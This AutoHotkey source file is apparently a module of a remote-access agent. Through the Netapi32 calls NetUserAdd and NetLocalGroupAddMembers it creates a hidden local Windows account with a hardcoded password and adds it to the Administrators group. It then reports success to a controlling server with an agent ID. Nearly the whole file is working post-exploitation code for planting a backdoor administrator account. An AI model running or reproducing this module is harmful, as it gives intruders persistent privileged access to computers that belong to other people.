; ============================================================================
; ADD ADMIN USER MODULE
; ============================================================================
; Creates a local user account and adds to Administrators group
; Requires administrative privileges
; ============================================================================

AddAdminUser(username := "TestUser", password := "P@ssw0rd123!", fullname := "Test User") {
    ; Constants
    UF_SCRIPT := 0x0001
    UF_NORMAL_ACCOUNT := 0x0200

    ; Load DLL
    hNetApi32 := DllCall("LoadLibrary", "Str", "Netapi32.dll", "Ptr")

    ; Requires admin
    if A_IsAdmin {

        ; Error code mapping
        ERROR_CODES := Map(
            2224, "The specified user account already exists.",
            2245, "The password does not meet the password policy requirements.",
            2226, "The user name or group name parameter is too long.",
            2202, "The specified username is invalid.",
            1378, "The specified local group already exists.",
            5, "Access denied.",
            87, "Invalid parameter.",
            8, "Not enough memory.",
            123, "Invalid name.",
            124, "Invalid level."
        )

        CreateLocalUser(username, password, fullname) {
            This.log("Starting CreateLocalUser function")

            try {
                structSize := A_PtrSize * 6 + 4 * 2
                userInfo := Buffer(structSize, 0)

                This.log("Created userInfo buffer of size: " userInfo.Size)

                offsets := Map(
                    "name", 0,
                    "password", A_PtrSize,
                    "password_age", A_PtrSize * 2,
                    "priv", A_PtrSize * 2 + 4,
                    "home_dir", A_PtrSize * 3,
                    "comment", A_PtrSize * 4,
                    "flags", A_PtrSize * 5,
                    "script_path", A_PtrSize * 5 + 4
                )

                For field, offset in offsets {
                    This.log("Field '" field "' offset: " offset)
                    if (offset + (InStr(field, "age") || InStr(field, "priv") || InStr(field, "flags") ? 4 : A_PtrSize) > structSize) {
                        throw Error("Field '" field "' would exceed buffer size")
                    }
                }

                usernamePtr := StrPtr(username)
                passwordPtr := StrPtr(password)

                This.log("Writing structure fields...")
                NumPut("Ptr", usernamePtr, userInfo, offsets["name"])
                NumPut("Ptr", passwordPtr, userInfo, offsets["password"])
                NumPut("UInt", 0, userInfo, offsets["password_age"])
                NumPut("UInt", 1, userInfo, offsets["priv"])
                NumPut("Ptr", 0, userInfo, offsets["home_dir"])
                NumPut("Ptr", 0, userInfo, offsets["comment"])
                NumPut("UInt", UF_SCRIPT|UF_NORMAL_ACCOUNT, userInfo, offsets["flags"])
                NumPut("Ptr", 0, userInfo, offsets["script_path"])

                This.log("Structure contents:")
                For field, offset in offsets {
                    value := NumGet(userInfo, offset, InStr(field, "age") || InStr(field, "priv") || InStr(field, "flags") ? "UInt" : "Ptr")
                    This.log("  " field ": 0x" format("{:X}", value))
                }

                parmError := Buffer(4, 0)

                This.log("Calling NetUserAdd...")
                result := DllCall("Netapi32\NetUserAdd",
                    "Ptr", 0,
                    "UInt", 1,
                    "Ptr", userInfo.Ptr,
                    "Ptr", parmError.Ptr)

                if (result != 0) {
                    lastError := DllCall("GetLastError")
                    This.log("API Error - Result: " result ", LastError: " lastError ", ParmError: " NumGet(parmError, 0, "UInt"))
                    errorMessage := ERROR_CODES.Has(result) ? ERROR_CODES[result] : "Unknown error (" result ")"
                    throw Error("Failed to create user: " errorMessage)
                }

                This.log("User creation successful")
                return true

            } catch Error as err {
                This.log("Error: " err.Message)
                if (err.Extra)
                    This.log("Extra info: " err.Extra)
                return false
            }
        }

        AddUserToAdminGroup(username) {
            This.log("Starting AddUserToAdminGroup for user: " username)

            try {
                memberInfo := Buffer(A_PtrSize, 0)
                usernamePtr := StrPtr(username)
                NumPut("Ptr", usernamePtr, memberInfo, 0)

                This.log("Calling NetLocalGroupAddMembers...")
                This.log("  Username ptr: " format("0x{:X}", usernamePtr))
                This.log("  Buffer ptr: " format("0x{:X}", memberInfo.Ptr))

                result := DllCall("Netapi32\NetLocalGroupAddMembers",
                    "Ptr", 0,
                    "Str", "Administrators",
                    "UInt", 3,
                    "Ptr", memberInfo.Ptr,
                    "UInt", 1,
                    "UInt")

                lastError := A_LastError
                This.log("NetLocalGroupAddMembers result: " result)
                This.log("LastError: " lastError)

                if (result != 0) {
                    errorMessage := ""
                    switch result {
                        case 1377: errorMessage := "User is already a member of the group"
                        case 1378: errorMessage := "Administrators group not found"
                        case 1387: errorMessage := "User account not found"
                        case 1388: errorMessage := "Invalid user account"
                        case 5: errorMessage := "Access denied"
                        default: errorMessage := "Unknown error: " result
                    }
                    throw Error("Failed to add user to Administrators group: " errorMessage, -1, result)
                }

                This.log("Successfully added user to Administrators group")
                return true

            } catch Error as err {
                This.log("Error adding user to group: " err.Message " (Code: " err.Extra ")")
                return false
            }
        }

        if CreateLocalUser(username, password, fullname) {
            if AddUserToAdminGroup(username) {
                DllCall("FreeLibrary", "Ptr", hNetApi32)
                message := Format("command_output|{}|{} created and added to Admin group", this.agentID, username)
                response := this.SendMsg(this.serverIP, this.serverPort, message)
                return true
            }
        }

        DllCall("FreeLibrary", "Ptr", hNetApi32)
        return false

    } else {
        message := Format("command_output|{}|The agent must be running as Admin for this module", this.agentID)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    }
}
